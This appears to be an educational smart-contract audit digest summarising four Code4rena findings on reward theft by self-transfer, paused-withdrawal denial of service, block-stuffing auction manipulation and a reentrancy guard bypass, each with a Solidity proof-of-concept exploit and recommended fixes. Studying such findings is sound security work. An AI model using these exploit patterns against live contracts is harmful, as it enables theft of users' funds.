# ETAAcademy-Adudit: 2. Transfer

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Transfer</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>transfer</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] Anyone can steal all distributed rewards

### Self-transfer

- Summary: By executing a self-transfer of tokens while in rebase, an attacker can mint additional tokens for themselves, effectively stealing all distributed rewards until that point. This occurs due to a discrepancy in updating share balances during the transfer process, leading to an incorrect calculation of token balances.
- Impact & Recommendation: Consequently, an attacker can repeatedly exploit this flaw to siphon off rewards intended for other users.To mitigate this issue, preventing self-transfers is recommended to prevent further exploitation and potential loss of funds.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#h-02-anyone-can-steal-all-distributed-rewards) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

  function testSelfTransfer() public {
    token.mint(address(this), 100e18);

    // Mint some tokens to bob and alice
    token.mint(alice, 10e18);
    token.mint(bobby, 10e18);
    // Bob enters the rebase since he wants to earn some profit
    vm.prank(bobby);
    token.enterRebase();
    // Tokens are distributed among all rebase users
    token.distribute(10e18);
    // Nobody claims the rebase rewards for 10 days - just for an example
    // Alice could frontrun every call that changes the unmintedRebaseRewards atomically
    // and claim all the rewards for herself
    vm.warp(block.timestamp + 10 days);
    // --------------------- ATOMIC TX ---------------------
    vm.startPrank(alice);
    token.enterRebase();
    uint256 token_balance_alice_before = token.balanceOf(alice);
    // Here the max she could transfer and steal is the unmintedRebaseRewards() amount
    // but we are using 3e18 just for an example as 3e18 < unmintedRebaseRewards()
    // since there is no public getter for unmintedRebaseRewards
    token.transfer(alice, 3e18);
    token.exitRebase();
    vm.stopPrank();
    uint256 token_balance_alice = token.balanceOf(alice);
    // --------------------- END ATOMIC TX ---------------------
    console.log("Token balance alice before : ", token_balance_alice_before);
    console.log("Token balance alice after  : ", token_balance_alice);
    console.log("--------------------------------------------------");
    console.log("Alice profit credit        : ", token_balance_alice - token_balance_alice_before);
  }


  ```

  </details>

## 2. [Medium] Inability to withdraw funds for certain users due to whenNotPaused modifier in RateLimitedMinter

### EmergencyWithdraw for paused protocol

- Summary: The GUARDIAN role is meant to freeze new protocol usage but allow fund withdrawals. However, the whenNotPaused modifier in the RateLimitedMinter.mint() function prevents users from withdrawing funds if they have CREDIT tokens staked with pending guild rewards. This occurs because the SurplusGuildMinter.unstake() function, called during withdrawal, tries to mint rewards through RateLimitedMinter.mint() by getRewards(), which fails if the protocol is paused.

- Impact & Recommendation: Introduce emergencyWithdraw for users to withdraw funds, excluding rewards when the protocol is paused.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-02-inability-to-withdraw-funds-for-certain-users-due-to-whennotpaused-modifier-in-ratelimitedminter) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function unstake(address term, uint256 amount) external {
        // apply pending rewards
        (, UserStake memory userStake, bool slashed) = getRewards(
            msg.sender,
            term
        );
    ...


    function getRewards(
        address user,
        address term
    )
        public
        returns (
            uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
            UserStake memory userStake, // stake state after execution of getRewards()
            bool slashed // true if the user has been slashed
        )
    {
    ...

                // forward rewards to user
            if (guildReward != 0) {
                RateLimitedMinter(rlgm).mint(user, guildReward);
                emit GuildReward(block.timestamp, user, guildReward);
            }
    ...

    function mint(
        address to,
        uint256 amount
    ) external onlyCoreRole(role) whenNotPaused {
        _depleteBuffer(amount); /// check and effects
        IERC20Mintable(token).mint(to, amount); /// interactions
    }


  ```

  </details>

## 3. [Medium] Auction manipulation by block stuffing and reverting on ERC-777 hooks

### Block stuffing attack on the auction

- Summary: A low immutable auction duration set in the deployment script can enable profitable block stuffing attacks on desired Layer 2 (L2) chains. The attacker borrows a loan to receive credit tokens and deposit collateral into the protocol. After the first partial duration, the attacker fails to repay the loan and initiates an auction. The attacker exploits the system by preventing bids until the midpoint, reducing costs, then begins block stuffing to acquire collateral by less credit tokens. Ultimately, the attacker may acquire almost the full loan amount, surpassing the gas cost for block stuffing.

- Impact & Recommendation: The attacker can manipulate the auction to acquire full collateral for almost zero credit tokens, resulting in loss for all stakers on the term. Increasing auction duration and implementing fixes to prevent bad debt from collateral token blacklisting can mitigate such attacks and prevent total loss of stake for lenders.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-16-auction-manipulation-by-block-stuffing-and-reverting-on-erc-777-hooks) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    function bid(bytes32 loanId) external {
        ...
        LendingTerm(_lendingTerm).onBid(
            loanId,
            msg.sender,
            auctions[loanId].collateralAmount - collateralReceived, // collateralToBorrower
            collateralReceived, // collateralToBidder
            creditAsked // creditFromBidder
        );
        ...
    }
    function onBid(
        bytes32 loanId,
        address bidder,
        uint256 collateralToBorrower,
        uint256 collateralToBidder,
        uint256 creditFromBidder
    ) external {
        ...
        int256 pnl;
        uint256 interest;
        if (creditFromBidder >= principal) {
            interest = creditFromBidder - principal;
            pnl = int256(interest);
        } else {
            pnl = int256(creditFromBidder) - int256(principal);
            principal = creditFromBidder;
            require(
                collateralToBorrower == 0,
                "LendingTerm: invalid collateral movement"
            );
        }
        ...
        // handle profit & losses
        if (pnl != 0) {
            // forward profit, if any
            if (interest != 0) {
                CreditToken(refs.creditToken).transfer(
                    refs.profitManager,
                    interest
                );
            }
            ProfitManager(refs.profitManager).notifyPnL(address(this), pnl);
        }
        ...
    }
    function notifyPnL(
        address gauge,
        int256 amount
    ) external onlyCoreRole(CoreRoles.GAUGE_PNL_NOTIFIER) {
        ...
        // handling loss
        if (amount < 0) {
            uint256 loss = uint256(-amount);
            // save gauge loss
            GuildToken(guild).notifyGaugeLoss(gauge);
            // deplete the term surplus buffer, if any, and
            // donate its content to the general surplus buffer
            if (_termSurplusBuffer != 0) {
                termSurplusBuffer[gauge] = 0;
                emit TermSurplusBufferUpdate(block.timestamp, gauge, 0);
                _surplusBuffer += _termSurplusBuffer;
            }
            if (loss < _surplusBuffer) {
                // deplete the surplus buffer
                surplusBuffer = _surplusBuffer - loss;
                emit SurplusBufferUpdate(
                    block.timestamp,
                    _surplusBuffer - loss
                );
                CreditToken(_credit).burn(loss);
            }
        } ...
    }
    function notifyGaugeLoss(address gauge) external {
        require(msg.sender == profitManager, "UNAUTHORIZED");
        // save gauge loss
        lastGaugeLoss[gauge] = block.timestamp;
        emit GaugeLoss(gauge, block.timestamp);
    }
    /// @notice apply a loss that occurred in a given gauge
    /// anyone can apply the loss on behalf of anyone else
    function applyGaugeLoss(address gauge, address who) external {
        // check preconditions
        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][who];
        require(
            _lastGaugeLoss != 0 && _lastGaugeLossApplied < _lastGaugeLoss,
            "GuildToken: no loss to apply"
        );
        // read user weight allocated to the lossy gauge
        uint256 _userGaugeWeight = getUserGaugeWeight[who][gauge];
        // remove gauge weight allocation
        lastGaugeLossApplied[gauge][who] = block.timestamp;
        _decrementGaugeWeight(who, gauge, _userGaugeWeight);
        if (!_deprecatedGauges.contains(gauge)) {
            totalTypeWeight[gaugeType[gauge]] -= _userGaugeWeight;
            totalWeight -= _userGaugeWeight;
        }
        // apply loss
        _burn(who, uint256(_userGaugeWeight));
        emit GaugeLossApply(
            gauge,
            who,
            uint256(_userGaugeWeight),
            block.timestamp
        );
    }

  ```

  </details>

## 4. [High] Exploitation of the receive Function to Steal Funds

### Reentrancy by receive function

- Summary: The contract has a reentrancy vulnerability due to a flaw in its guard mechanism. Attackers can reset the guard using a receive function, allowing them to execute unauthorized withdrawals. They can deposit ETH, borrows some, then initiates a withdrawal, resetting the guard to pay off their own loan and withdraw additional funds.

- Impact & Recommendation: The vulnerability enables unauthorized fund withdrawals from the contract. The recommendation is to add a reentrancy check to the \_sendValue function to prevent exploitation, without disrupting transfers from the WETH address.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-01-exploitation-of-the-receive-function-to-steal-funds) & [Report](https://code4rena.com/reports/2024-02-wise-lending)

  <details><summary>POC</summary>

  ```solidity
    // import ContractA
    import "./ContractA.sol";
    // import MockErc20
    import "./MockContracts/MockErc20.sol";
    contract WiseLendingShutdownTest is Test {
        ...
        ContractA public contractA;
        function _deployNewWiseLending(bool _mainnetFork) internal {
            ...
            contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));
            ...
        }
        function testExploitReentrancy() public {
            uint256 depositValue = 10 ether;
            uint256 borrowAmount = 2 ether;
            vm.deal(address(contractA), 2 ether);
            ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);
            POSITION_NFTS_INSTANCE.mintPosition();
            uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);
            LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);
            LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);
            vm.prank(address(LENDING_INSTANCE));
            MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);
            // check contractA balance
            uint ethBalanceStart = address(contractA).balance;
            uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
            //total
            uint totalBalanceStart = ethBalanceStart + wethBalanceStart;
            console.log("totalBalanceStart", totalBalanceStart);
            // deposit using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();
            vm.stopPrank();
        FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);

            // withdraw weth using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);
            vm.stopPrank();
            // approve feemanager for 1 weth from contractA
            vm.startPrank(address(contractA));
            MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);
            vm.stopPrank();
            // borrow using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);
            vm.stopPrank();
            // Payback amount
            //499537556593483218
            // withdraw using contractA
            vm.startPrank(address(contractA));
            LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);
            vm.stopPrank();
            // check contractA balance
            uint ethBalanceAfter = address(contractA).balance;
            uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
            //total
            uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;
            console.log("totalBalanceAfter", totalBalanceAfter);
            uint diff = totalBalanceAfter - totalBalanceStart;
            assertEq(diff > 5e17, true, "ContractA profit greater than 0.5 eth");
        }
    // SPDX-License-Identifier: -- WISE --
    pragma solidity =0.8.24;
    // import lending and fees contracts
    import "./WiseLending.sol";
    import "./FeeManager/FeeManager.sol";
    contract ContractA {
        address public feesContract;
        address payable public lendingContract;
        address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        constructor(address _feesContract, address payable _lendingContract) payable {
            feesContract = _feesContract;
            lendingContract = _lendingContract;
        }
        fallback() external payable {
            if (msg.sender == lendingContract) {
                // send lending contract 0.01 eth to reset reentrancy flag
                (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}("");
                //paybackBadDebtForToken
                FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);
            }
        }
    }


  ```

  </details>
